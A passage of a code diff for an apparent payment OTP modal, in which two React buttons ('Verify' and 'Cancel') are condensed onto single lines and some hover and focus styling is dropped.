-                <button
-                  onClick={handleSubmitOTP}
-                  disabled={processingPayment}
-                  className="flex-1 inline-flex items-center justify-center gap-2 rounded-lg bg-gradient-to-r from-blue-500 to-sky-500 px-4 py-2 text-sm font-semibold text-white hover:from-blue-600 hover:to-sky-600 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 disabled:opacity-50 disabled:cursor-not-allowed"
-                >
-                  {processingPayment ? (
-                    <>
-                      <Loader2 className="h-4 w-4 animate-spin" />
-                      Verifying...
-                    </>
-                  ) : (
-                    'Verify & Complete'
-                  )}
+                <button onClick={handleSubmitOTP} disabled={processingPayment} className="flex-1 inline-flex items-center justify-center gap-2 rounded-lg bg-gradient-to-r from-blue-500 to-sky-500 px-4 py-2 text-sm font-semibold text-white disabled:opacity-50 disabled:cursor-not-allowed">
+                  {processingPayment ? <><Loader2 className="h-4 w-4 animate-spin" />Verifying...</> : 'Verify'}
                 </button>
-                <button
-                  onClick={() => setShowOTPModal(false)}
-                  disabled={processingPayment}
-                  className="flex-1 inline-flex items-center justify-center gap-2 rounded-lg border border-gray-200 px-4 py-2 text-sm font-medium text-gray-700 hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-gray-200 transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
-                >
+                <button onClick={() => setShowOTPModal(false)} disabled={processingPayment} className="flex-1 inline-flex items-center justify-center gap-2 rounded-lg border border-gray-200 px-4 py-2 text-sm font-medium text-gray-700 disabled:opacity-50 disabled:cursor-not-allowed">
                   Cancel
                 </button>
               </div>
